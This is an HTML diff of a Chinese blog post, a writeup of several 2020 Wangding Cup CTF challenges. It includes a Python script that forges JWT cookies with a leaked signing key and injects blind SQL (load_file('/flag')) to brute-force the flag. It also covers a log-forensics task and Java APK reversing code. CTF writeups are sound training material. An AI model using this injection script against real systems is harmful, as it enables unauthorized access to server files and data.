@@ -1,114 +1,395 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
+  <title>2020年网鼎杯初赛玄武组部分writeup | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="2020年网鼎杯初赛玄武组部分writeup jwt注入、java逆向、杂项、签到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020年网鼎杯初赛玄武组部分writeup">
+<meta property="og:url" content="http://www.greetdawn.top/2020/05/22/ctf/ctf-2020wdcup-xuanwuteam/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:description" content="2020年网鼎杯初赛玄武组部分writeup jwt注入、java逆向、杂项、签到">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/4.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps1.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps2.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps3.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps4.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps5.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps6.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps7.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps8.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps8.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps10.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/wps11.jpg">
+<meta property="article:published_time" content="2020-05-22T01:03:05.000Z">
+<meta property="article:modified_time" content="2021-01-29T08:15:17.230Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="网鼎杯">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/4.jpg">
   
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2020/05/22/ctf/ctf-2020wdcup-xuanwuteam/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
-  
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-ctf/ctf-2020wdcup-xuanwuteam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      2020年网鼎杯初赛玄武组部分writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/4.jpg" alt="4"></p>
+<blockquote>
+<p>2020年网鼎杯初赛玄武组部分writeup</p>
+<p>jwt注入、java逆向、杂项、签到</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="题目序号-16-题目名称-js-on"><a href="#题目序号-16-题目名称-js-on" class="headerlink" title="题目序号    16    题目名称    js_on"></a>题目序号    16    题目名称    js_on</h3><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>访问页面尝试弱口令进行登录 测试出 账号admin  密码admin可以登录进页面发现有个key值</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps1.jpg"></p>
+<p>推测与全国信安比赛CISCN2018的web题easyweb 类似 是利用JWT伪造cookie</p>
+<p>访问<a target="_blank" rel="noopener" href="https://jwt.io网站/">https://jwt.io网站</a> 将admin页面的token值进行带入 右边回显完信息后  然后将 key值复制进VERIFY SIGNATURE 代码框中 同时在 user 变量中 构造注入语句 </p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps2.jpg"></p>
+<p>测试注入语句为 admin’and (select counet(*) from admin)&gt;0，猜测是否有admin表  （将伪造的token替换到admin 页面抓的包中）,发现回显 get out heacker </p>
+<p>证明思路正确，接下来就是构造注入payload</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps3.jpg"></p>
+<p>尝试了各种注入语句发现不管怎么构造 只要出现单引号和select&amp;union就会被检测过滤。猜测是否是读取文件，用+替换空格，构造payload为，</p>
+<p>admin’and+substr(load_file(‘/flag’),1,1)=1#，尝试判断可能存在的字符串</p>
+<p>写py脚本 实现批量猜解。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> jwt
+
+url <span class="token operator">=</span> <span class="token string">"http://61c689d7c58b46fbaa40097072b1e5b90859d0e18970409f.cloudgame2.ichunqiu.com/index.php"</span>
+chars <span class="token operator">=</span> <span class="token string">'&#123;&#125;-abcdefghigklmnopqrstuvwxyz0123456789'</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
+        <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span>
+        <span class="token punctuation">&#125;</span>
+        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"user"</span><span class="token punctuation">:</span> <span class="token string">"admin'and+substr(load_file('/flag'),&#123;num&#125;,1)='&#123;ch&#125;'#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">,</span>ch<span class="token operator">=</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"news"</span><span class="token punctuation">:</span> <span class="token string">"key:xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6"</span>
+        <span class="token punctuation">&#125;</span>
+
+        encode_jwt <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6'</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> header<span class="token punctuation">)</span>
+
+        cookies_data0 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'__jsluid_h'</span><span class="token punctuation">:</span><span class="token string">'7624a174d2449ec0266b2b5b4b93cb80'</span><span class="token punctuation">,</span>
+            <span class="token string">'token'</span><span class="token punctuation">:</span> encode_jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'</span><span class="token punctuation">,</span>
+            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment"># print(encode_jwt.decode())</span>
+
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> cookies <span class="token operator">=</span> cookies_data0<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"key:xRt"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span></code></pre>
+
+
+
+
+
+<h3 id="题目序号-3-题目名称-ransom"><a href="#题目序号-3-题目名称-ransom" class="headerlink" title="题目序号    3    题目名称    ransom"></a>题目序号    3    题目名称    ransom</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>分析日志，按事件id，先过滤事件id528，找到所有登陆失败的情况。</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps4.jpg"></p>
+<p>找到攻击者id为192.200.200.40</p>
+<p>根据提示：rdp最后登录成功的情况。过滤关键词rdp，在结果中找到192.200.200.40的最后一次登录信息。</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps5.jpg"></p>
+<p>根据信息打开rdp.exe回答问题，得到flag</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps6.jpg"></p>
+<h3 id="题目序号-1-题目名称-签到"><a href="#题目序号-1-题目名称-签到" class="headerlink" title="题目序号    1    题目名称    签到"></a>题目序号    1    题目名称    签到</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>打游戏通关至p14，输入本队token，输入f12，查看元素得到flag</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps7.jpg"></p>
+<h3 id="题目序号-15-题目名称-java"><a href="#题目序号-15-题目名称-java" class="headerlink" title="题目序号    15    题目名称    java"></a>题目序号    15    题目名称    java</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>把apk用jeb打开.</p>
+<p>确定MainActivity, 找到判断的函数.</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps8.jpg"></p>
+<p>分析funca函数</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps8.jpg"></p>
+<p>重点分析标的1,2,3函数.</p>
+<p>方法3内容简单,就是base64的加密.</p>
+<p>方法2为输入的字节数组,分别进行异或22和代码中给出的整形数组.</p>
+<p>方法1为加密.但是在开始的使用会在输入的字符串后面追加未知长度的内容.</p>
+<p>加密的时候替换了字符串中的字符</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps10.jpg"></p>
+<p>根据方法1~3写出逆函数, 打印出flag.</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/wps11.jpg"></p>
+<p>Apk汇编重构如下：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>nisodaisuki<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">androidx<span class="token punctuation">.</span>appcompat<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">AppCompatActivity</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">Key</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Log</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span>
+        <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+
+        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"ccccc"</span><span class="token punctuation">,</span> <span class="token string">"------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">String</span> ddd <span class="token operator">=</span> <span class="token string">"VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3"</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span>  <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>ddd<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span>NO_WRAP<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
+                <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span>
+                <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span>
+                <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span>
+                <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span>
+                <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">0xD6</span>
+        <span class="token punctuation">&#125;</span> <span class="token punctuation">;</span>
+        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"length---------------"</span> <span class="token operator">+</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            encode<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>encode<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            len<span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            encode<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>encode<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            len<span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+
+        <span class="token comment">/*
+        *  public static final int ENCRYPT_MODE = 1;
+        public static final int DECRYPT_MODE = 2;
+         */</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">String</span>  sss <span class="token operator">=</span> <span class="token string">"aes_check_key!@#"</span><span class="token punctuation">;</span>
+            sss <span class="token operator">=</span> sss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">SecretKeySpec</span> v5_2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>sss<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Cipher</span> v6 <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/ECB/NoPadding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            v6<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span>DECRYPT_MODE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Key</span><span class="token punctuation">)</span>v5_2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            encode <span class="token operator">=</span> v6<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> v5_1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Exception v5_1---------------"</span> <span class="token operator">+</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"length---------------"</span> <span class="token operator">+</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> dfdsf <span class="token operator">=</span> encode<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dfdsf<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>dfdsf<span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>encode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> tt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> dfdsf<span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> dessssstring <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">//</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------"</span><span class="token operator">+</span>dessssstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+
+
+
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2020/05/22/ctf/ctf-2020wdcup-xuanwuteam/" class="article-date">
+  <time class="dt-published" datetime="2020-05-22T01:03:05.000Z" itemprop="datePublished">2020-05-22</time>
+</a>
+
+        </li>
+        
+          <li>
+            <span class="label">Category:</span>
+            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a>
   </div>
-</footer>
-</div>
-</div>
-
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
-<script src="/js/xenon-custom.min.js"></script>
 
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/" rel="tag">网鼎杯</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2020/08/10/config/change-compute-config/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          更换电脑之后博客迁移操作
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/11/web-security/web-security-frame/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web安全技术体系导图</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
